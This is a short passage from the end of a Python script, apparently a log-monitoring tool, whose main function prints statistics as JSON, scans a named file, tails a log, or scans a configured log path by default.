            "metrics": monitor.db.get_stats(),
        }
        print(json.dumps(summary, indent=2))
        return

    if args.scan_file:
        res = monitor.scan_file(args.scan_file)
        print(json.dumps(res, indent=2))
        return

    if args.tail:
        monitor.tail_log_file()
        return

    # Default action if no arguments: scan configured log path
    res = monitor.scan_file(config.log_path)
    print(json.dumps(res, indent=2))


if __name__ == "__main__":
    main()
